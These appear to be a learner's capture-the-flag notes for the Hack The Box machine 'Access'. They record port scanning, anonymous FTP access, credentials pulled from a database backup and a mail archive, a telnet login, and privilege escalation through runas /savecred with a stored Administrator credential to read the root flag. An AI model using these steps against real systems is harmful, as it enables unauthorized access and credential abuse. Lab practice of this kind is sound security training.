```
Access HTB 
IP:10.10.10.98

lessons learned:
- sqlmdb
- anonymous login ftp
- runas.exe ( sudo equivalent )
```

```
5:33 PM 1/18/2023

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/access]
└─# nmap -sC -sV -oA nmap 10.10.10.98
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 22:29 EST
Nmap scan report for 10.10.10.98
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
5:38 PM 1/18/2023																												# ftp anonymous login allowed, unable to put files on or get files
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
550 Access is denied. 
```

```
5:40 PM 1/18/2023																												# browsing to website doesn't have anything but a picture of a server room with "LON-MC6" on it.
```

```
5:40 PM 1/18/2023																												# nothing on gobuster
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.10.10.98:80 -w /usr/share/wordlists/dirb/common.txt -t 64    
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.98:80
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/18 22:42:48 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 159] [--> http://10.10.10.98:80/aspnet_client/]
/index.html           (Status: 200) [Size: 391]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/01/18 22:42:59 Finished
===============================================================
```

```
5:44 PM 1/18/2023
┌──(root㉿kali)-[/home/kali]
└─# searchsploit 7.5 IIS                                       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                  | windows/remote/19033.txt
Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC)                                                                                                                        | windows/dos/15803.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali]
└─# 

http://10.10.10.98:80/aspnet_client/:$i30:$INDEX_ALLOCATION																																			# nope	

http://10.10.10.98:80/aspnet_client:$i30:$INDEX_ALLOCATION/admin.php																																# nope, going to watch walkthrough to get me going.
```

```
6:12 PM 1/18/2023
┌──(root㉿kali)-[/home/kali]																																									# downloaded to read files pulled from ftp server
└─# apt-get install mdb-sql    
```

```
6:14 PM 1/18/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# apt-get install pst-utils
```

```
6:53 PM 1/18/2023
creds from backup.mdb file that i just refused to download
admin:admin
engineer:access4u@security
backup_admin:admin
```

```
6:56 PM 1/18/2023
telnet doesnt work.
```

```
6:57 PM 1/18/2023
following walkthrough at this point. - put access4u@security password into .pst file - spit out new password for security account as 4Cc3ssC0ntr0ller
```

```
7:00 PM 1/18/2023
telnet'd on with security:4Cc3ssC0ntr0ller
```

```
7:02 PM 1/18/2023

C:\Users\security>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
7:03 PM 1/18/2023
C:\Users\security>cmdkey /list																							# see if theres stored credentials on machine to runas administrator (windows equivalent of sudo) 

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

C:\Users\security>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"					# successful runas

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security
```

```
01/19/2023  05:13 AM                34 root.txt
               1 File(s)             34 bytes
              14 Dir(s)   3,342,446,592 bytes free

C:\Users\security>

C:\Users\security>type root.txt
26da9e8228b1fd552b03a87e33f62375

C:\Users\security>
